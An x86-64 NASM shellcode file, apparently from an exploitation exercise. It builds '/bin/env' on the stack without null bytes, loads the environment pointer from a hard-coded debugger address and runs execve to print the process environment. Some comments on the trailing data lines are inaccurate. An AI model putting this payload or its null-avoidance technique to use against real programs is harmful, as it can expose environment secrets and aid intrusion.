BITS 64

section .text
global _start

_start:
    
    ; Clear the registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    ; move /bin/env into stack
    ; Set up "/bin/env" string on the stack
    push rax            ; Terminating NULL for the string
    mov rdi, '/bin/env' ; "/bin/env" in reverse (little endian)
    push rdi

    ; Set rdi to point to the "/bin/env" string
    mov rdi, rsp

    ; Set up the argv array on the stack
    push rax            ; Terminating NULL pointer for argv
    push rdi            ; Pointer to "/bin/env"

    ; Set rsi to point to the argv array
    mov rsi, rsp

    ;load the contents of the environ variable 0x7ffff7fbe600 <environ> into the rdx
    ; Clear the rdx register (all 0 bits)
    xor rdx, rdx

    ; Load 0x7fff into the low 16 bits of the rdx register (dx)
    mov dx, 0x7fff

    ; Left shift the rdx register by 32 bits
    shl rdx, 32

    ; Load 0xf7fbe6ff into the low 32 bits of rcx (ecx, this also clears the rest of rcx)
    mov ecx, 0xf7fbe6ff

    ; Clear the low 8 bits of the rcx register (cl) without introducing null character
    shr rcx, 8  ; Shift right by 8 bits to bring back the original upper bits
    shl rcx, 8  ; Shift left by 8 bits, which clears the low 8 bits

    ; Combine the registers using the OR instruction
    or rdx, rcx

    ; Load the rdx register with the memory pointed to by the rdx register
    mov rdx, [rdx]


    ; Set up the syscall to execute /bin/env
    ; Setup for execve system call
    xor rax, rax       ; Clear rax to ensure no higher bits are set
    mov al, 0x3B       ; 0x3B is the syscall number for execve in x86-64
    ; At this point, make sure rdi, rsi, and rdx are set up appropriately for execve
    syscall            ; Perform the execve syscall

    ; Setup for exit system call
    mov rdi, rax       ; Move the return code from execve to rdi
    xor rax, rax       ; Clear rax to ensure no higher bits are set
    mov al, 0x3C       ; 0x3C is the syscall number for exit in x86-64
    syscall            ; Perform the exit syscall

    dq 0xffffffffffffffff   ; push the pointer to '/bin/env'
    dq 0xffffffffffffffff   ; push the secon rzx null
    dq 0xffffffffffffffff   ; push the '/bin/env'
    dq 0xffffffffffffffff   ; push the first rax null
end: dd end-_start 